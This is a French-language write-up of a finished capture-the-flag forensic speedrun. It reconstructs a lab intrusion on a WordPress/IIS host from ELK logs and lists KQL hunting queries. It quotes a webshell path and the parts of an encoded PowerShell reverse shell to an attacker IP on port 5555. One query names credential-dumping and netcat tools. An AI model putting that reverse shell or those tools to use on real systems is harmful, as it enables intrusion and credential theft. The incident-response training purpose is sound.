# The Gauntlet — SpeedRun DFIR HLB2K26

**Épreuve** : speedrun d'investigation numérique sur ELK (`dfir.hackerlab.bj`) —
30 questions, 60 secondes par question, 100 points maximum, décroissance 0,5 avec un
plancher à 0,5, trois modifications de réponse autorisées (la dernière horodatée fait
foi), progression automatique.

**Statut** : épreuve terminée (18 équipes engagées). L'accès joueur n'est ouvert qu'au
capitaine une fois le speedrun lancé ; les questions ne sont lisibles qu'avec le jeton
approprié.

---

## Environnement d'investigation

- **Kibana** : espace `cobra`, rôle `analyst_cobra` (compte d'équipe partagé).
- **Vue de données** : « DFIR Logs » — motif `.ds-logs-*,.ds-metrics-*`, champ temporel
  `@timestamp`.

> Attention : l'alias `logs-*` ne renvoie **aucun fragment** pour ce rôle. Toujours
> passer par la vue de données ou par les index concrets `.ds-logs-...`.

## Le corpus

- **7 169 141 événements**, sur une fenêtre unique : du **6 novembre 2026, 09:29:30 UTC,
  à 13:14:53 UTC** (à poser en absolu dans le sélecteur de temps, jamais en
  `now-15m`).
- Un seul hôte : `win-m16q1kog02o`.

| Index | Documents | Usage |
|---|---:|---|
| `.ds-logs-windows.sysmon_operational-*` | 2 825 554 | processus, réseau, fichiers (l'événement 10 est majoritairement du bruit) |
| `.ds-logs-winlog.security-*` | 1 110 195 | accès aux objets 4656/4663/4658 ; 4688 = 109 seulement |
| `.ds-logs-windows.powershell*` | ≈ 815 000 | scripts |
| `.ds-logs-network_traffic.flow-*` | 335 113 | flux réseau |
| `.ds-logs-mysql.slowlog-*` | 308 358 | requêtes SQL lentes |
| `.ds-logs-iis.access-*` | 177 094 | journaux HTTP |
| `.ds-logs-endpoint.alerts-*` | **39** | détecteurs — **à lire en premier** |

## Chaîne d'intrusion reconstituée

1. **Serveur IIS hébergeant WordPress**. Source quasi unique : `192.168.24.128`
   (176 887 requêtes) ; source secondaire : `192.168.24.200` (207 requêtes).
2. **11 432 requêtes** vers `/wp-login.php` ; également `/wp-config.php`,
   `/wp-config.bak`, `/wp-config.old` et `/xmlrpc.php`.
3. **Webshell** :
   `/wp-content/uploads/forminator/59_eb3138037cd77a85cda14d6e687009c4/uploads/pkKnndRhc7df-shell.php`
   (20 requêtes).
4. Parent des processus exécutés : **`w3wp.exe` → `C:\PHP\php-cgi.exe`** (88 créations)
   — la piste est un PHP en mode CGI.
5. À `2026-11-06T09:56:36Z`, sous l'utilisateur **`DefaultAppPool`** avec `cmd.exe`
   pour parent : un PowerShell `-enc` déploie un **reverse shell TCP vers
   192.168.24.128:5555** (Base64 UTF-16LE :
   `TCPClient("192.168.24.128",5555)` suivi de `Invoke-Expression`).
6. **Alertes (39)**, par ordre d'intérêt : Potential Pentesting PowerShell (10),
   Base64 Decoding (6), Downloads (6), Credential Access via Known Utilities (3),
   Obfuscated PowerShell (3), Suspicious PowerShell Execution (3), Registry Hive Dump
   (2), NetCat (1), SeImpersonatePrivilege (1), Startup Persistence wscript (1),
   Scheduled Task (1), Run key (1), Windows.Exploit.FakePipe (1).
7. Comptes observés dans Sysmon : `Système`, `DefaultAppPool`, **`svc_update`**
   (31 756 événements), `Administrateur` (1 342), plusieurs `sshd_<pid>`.
8. Destinations des connexions (événement Sysmon 3) : `192.168.24.200` (3 645),
   `.130` (2 222), `.128` (14 — le poste de commandement), plus le bruit multicast et
   loopback habituel.

## Requêtes KQL types (Discover)

```
data_stream.dataset:endpoint.alerts
process.name:php-cgi.exe
process.parent.name:w3wp.exe
url.path:*shell.php
process.command_line:*192.168.24.128*
process.name:powershell.exe and process.command_line:*enc*
user.name:svc_update
process.name:(reg.exe or regsave or ntdsutil or procdump or net.exe or nc.exe or ncat.exe or wscript.exe or cscript.exe)
event.code:1 and process.name:whoami.exe
```

Le décodage des commandes `-enc` se fait en Base64 UTF-16LE ; la première commande
retrouvée est le reverse shell décrit ci-dessus.

---

## Leçons pour un speedrun d'investigation

- **Commencer par les alertes** : le jeu de données `endpoint.alerts` ne compte que
  39 documents et résume l'attaque entière — c'est la carte du corpus.
- Poser la **fenêtre temporelle absolue** dès la première minute : un sélecteur
  relatif (`now-15m`) sur un corpus de 2026 ne renvoie rien et fait perdre un temps
  précieux.
- Préparer les requêtes KQL à l'avance (webshell, `-enc`, comptes de service) : à
  60 secondes par question, la requête doit être prête avant même que la question
  n'apparaisse.
- Caler le format des réponses (dates, chemins, adresses) sur le barème annoncé, et se
  souvenir que seule la dernière réponse horodatée fait foi : mieux vaut une réponse
  posée qu'une correction précipitée.
